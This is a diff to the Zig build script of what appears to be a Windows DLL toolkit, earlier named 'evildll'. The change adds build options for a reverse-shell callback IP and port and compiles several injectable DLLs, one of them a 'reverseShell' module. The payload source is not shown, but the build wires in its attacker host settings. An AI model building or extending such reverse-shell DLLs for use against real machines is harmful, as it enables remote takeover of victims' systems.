@@ -5,13 +5,19 @@ pub fn build(b: *std.Build) void {
     const optimize: std.builtin.OptimizeMode = b.standardOptimizeOption(.{});
     const target: std.Build.ResolvedTarget = b.standardTargetOptions(.{});
 
+    // Vars
+    const ipv4 = b.option([]const u8, "ipv4", "Ip for reverse shell") orelse "127.0.0.1";
+    const port = b.option(u32, "port", "Port for reverse shell") orelse 8080;
+    const options = b.addOptions();
+    options.addOption([]const u8, "ipv4", ipv4);
+    options.addOption(u32, "port", port);
+
     //Deps
     const zigwin32 = b.dependency("zigwin32", .{});
+    const cli = b.dependency("cli", .{});
+
     // Shared Module
-    const loggerModule = b.addModule("logger", .{
-        .root_source_file = b.path("src/lib/logger.zig"),
-        .target = target,
-    });
+    const loggerModule = b.addModule("logger", .{ .root_source_file = b.path("src/lib/logger.zig"), .target = target });
 
     const winModule = b.addModule("win", .{ .root_source_file = b.path("src/lib/win.zig"), .target = target, .imports = &.{ .{
         .name = "win32",
@@ -19,12 +25,25 @@ pub fn build(b: *std.Build) void {
     }, .{ .name = "logger", .module = loggerModule } } });
 
     // Dll compilation for windows
-    const dll = b.addLibrary(.{
-        .name = "evildll",
-        .linkage = .dynamic,
-        .root_module = b.createModule(.{ .link_libc = true, .root_source_file = b.path("src/dll.zig"), .target = target, .optimize = optimize, .imports = &.{ .{ .name = "win", .module = winModule }, .{ .name = "logger", .module = loggerModule } } }),
-    });
-    b.installArtifact(dll);
+    const dlls = &[_]struct {
+        name: []const u8,
+        path: []const u8,
+        imports: ?[]const std.Build.Module.Import,
+    }{
+        .{ .name = "console", .path = "src/dll/console.zig", .imports = &.{ .{ .name = "win", .module = winModule }, .{ .name = "logger", .module = loggerModule } } },
+        .{ .name = "messageBoxs", .path = "src/dll/messageBoxs.zig", .imports = &.{ .{ .name = "win", .module = winModule }, .{ .name = "logger", .module = loggerModule } } },
+        .{ .name = "reverseShell", .path = "src/dll/reverseShell.zig", .imports = &.{ .{ .name = "win", .module = winModule }, .{ .name = "logger", .module = loggerModule } } },
+    };
+
+    for (dlls) |dll| {
+        const dllFile = b.addLibrary(.{
+            .name = dll.name,
+            .linkage = .dynamic,
+            .root_module = b.createModule(.{ .link_libc = true, .root_source_file = b.path(dll.path), .target = target, .optimize = optimize, .imports = dll.imports.? }),
+        });
+        dllFile.root_module.addOptions("reverse_shell_options", options);
+        b.installArtifact(dllFile);
+    }
 
     // Test file build in c for windows
     const testExe = b.addExecutable(.{
@@ -48,7 +67,7 @@ pub fn build(b: *std.Build) void {
             .target = target,
             .optimize = optimize,
             .link_libc = true,
-            .imports = &.{ .{ .name = "lib", .module = libmod }, .{ .name = "win32", .module = zigwin32.module("win32") }, .{ .name = "win", .module = winModule }, .{ .name = "logger", .module = loggerModule } },
+            .imports = &.{ .{ .name = "lib", .module = libmod }, .{ .name = "win32", .module = zigwin32.module("win32") }, .{ .name = "win", .module = winModule }, .{ .name = "logger", .module = loggerModule }, .{ .name = "cli", .module = cli.module("cli") } },
         }),
     });
 
